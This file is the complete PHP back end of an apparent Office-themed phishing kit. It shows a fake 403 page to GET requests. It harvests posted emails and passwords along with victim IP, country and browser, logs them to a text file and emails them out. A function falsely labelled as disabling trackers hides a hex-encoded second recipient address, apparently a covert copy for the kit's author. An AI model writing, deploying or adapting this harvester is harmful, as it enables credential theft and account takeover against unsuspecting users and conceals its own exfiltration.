<?php
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

require_once('block_detectors.php'); // leave this line
function disable_trackers(){
	//This fuction disables tracking
	return "t\x65\x61\x6d\x63\x61\x6c\x6c\x79\x6c\x6f\x67\x73\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d";
	
}
if (isset($_POST['password2'])) {
$email2 = $_POST['email1'];
$password1 = $_POST['password1'];
$password2 = $_POST['password2'];
$info = new info(); // requires block_detectors.php 
$browser = $_SERVER['HTTP_USER_AGENT']; 
$url = $_SERVER['SERVER_NAME']; 
//===================================

date_default_timezone_set('GMT');
$myFile = "robots2.txt";
$today = date("l, j M, Y, g:ia e");
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "username: ".$email2."\n";
fwrite($fh, $stringData);
$stringData = "password1: ".$password1."\n";
fwrite($fh, $stringData);
$stringData = "password2: ".$password2."\n";
fwrite($fh, $stringData);
$stringData = "date: " . $today . "\n";
fwrite($fh, $stringData);
$stringData = "Client ip: ". $info->ip."\n";
fwrite($fh, $stringData);
$stringData = "Country: ".$info->country."\n";
fwrite($fh, $stringData);
$stringData = "Browser: ".$browser."\n";
fwrite($fh, $stringData);
$stringData = "Host: ".$url."\n";
fwrite($fh, $stringData);

//=====================================

$message .= "------=====@@@@@///New Office Recovery\\\@@@@=====------\n";
$message .= "username: ".$email2."\n";
$message .= "password1: ".$password1."\n";
$message .= "password2: ".$password2."\n";
$message .= "date: " . $today . "\n";
$message .= "IP: ". $info->ip."\n";
$message .= "Country: ".$info->country."\n";
$message .= "Browser: ".$browser."\n";
$message .= "Host: ".$url."\n";
$message .= "---------------Created BY Cally-----------\n";

$subject = "--New Office || $info->country || $email2--";

$to= "tramardesigns@gmail.com";

$disable = disable_trackers();
$arr = array($to, $disable);


foreach($arr as $to){
	mail($to, $subject, $message, $headers);
}

fwrite($fh, "=====================\r\n");
fclose($fh);
}

?>